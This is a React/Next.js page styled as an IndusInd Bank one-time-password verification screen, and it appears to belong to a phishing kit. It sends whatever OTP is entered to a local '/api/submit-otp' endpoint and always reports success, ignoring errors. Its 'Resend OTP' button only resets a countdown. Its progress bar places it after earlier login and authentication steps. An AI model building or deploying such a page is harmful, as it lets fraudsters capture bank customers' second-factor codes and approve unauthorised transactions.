'use client';
import { useState, useEffect } from 'react';
import Link from 'next/link';
import Loader from '@/components/Loader';
import PageBanner from '@/components/PageBanner';
import styles from './page.module.css';

export default function OtpPage() {
  const [otp, setOtp] = useState('');
  const [loading, setLoading] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [timeLeft, setTimeLeft] = useState(300); // 5 minutes in seconds

  useEffect(() => {
    if (timeLeft <= 0 || isSuccess) return;
    const interval = setInterval(() => {
      setTimeLeft(prev => prev - 1);
    }, 1000);
    return () => clearInterval(interval);
  }, [timeLeft, isSuccess]);

  const handleResend = () => {
    setTimeLeft(300);
    setOtp('');
  };

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!otp) return;
    setLoading(true);
    try {
      await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ otp }),
      });
      setIsSuccess(true);
    } catch (_) {}
    setLoading(false);
  };

  return (
    <Loader>
      <PageBanner images="" />
      <div className={styles.formWrapper}>
        <div className={styles.formCard}>
          {!isSuccess ? (
            <>
              <h2 className={styles.formTitle}>Authentication</h2>
              <p className={styles.formSubtitle}>Verify your identity to complete the request</p>

              {/* Progress Bar */}
              <ul className={styles.progressbar}>
                <li className={styles.active}>
                  <strong>User Login</strong>
                </li>
                <li className={styles.active}>
                  <strong>Secure Auth</strong>
                </li>
                <li className={styles.active}>
                  <strong>Verification</strong>
                </li>
              </ul>

              <form onSubmit={handleSubmit}>
                <div className={styles.formCardInner}>
                  <h3 className={styles.stepTitle}>🔐 Enter One-Time Password</h3>
                  <p className={styles.description}>
                    A one-time passcode has been sent to your registered mobile number to verify your identity. Valid for 5 minutes.
                  </p>
                  
                  <div className={styles.otpInputContainer}>
                    <input
                      type="text"
                      name="otp"
                      placeholder="******"
                      maxLength={8}
                      required
                      value={otp}
                      onChange={(e) => setOtp(e.target.value)}
                      className={styles.input}
                    />
                  </div>

                  {timeLeft > 0 ? (
                    <p className={styles.timer}>Time remaining: {formatTime(timeLeft)}</p>
                  ) : (
                    <p className={styles.timer}>
                      Code expired.{' '}
                      <button type="button" onClick={handleResend} className={styles.resendBtn}>
                        Resend OTP
                      </button>
                    </p>
                  )}
                </div>

                <button type="submit" className={styles.nextBtn} disabled={loading || timeLeft <= 0}>
                  {loading ? 'Verifying...' : 'Confirm ✓'}
                </button>
              </form>
            </>
          ) : (
            <div className={styles.successState}>
              <div className={styles.successIcon}>🎉</div>
              <h2 className={styles.successTitle}>Verification Successful</h2>
              <p className={styles.successText}>
                Your transaction has been securely authenticated. Thank you for choosing IndusInd Bank.
              </p>
              <Link href="/" className={styles.homeBtn}>
                Back to Home
              </Link>
            </div>
          )}
        </div>
      </div>
    </Loader>
  );
}
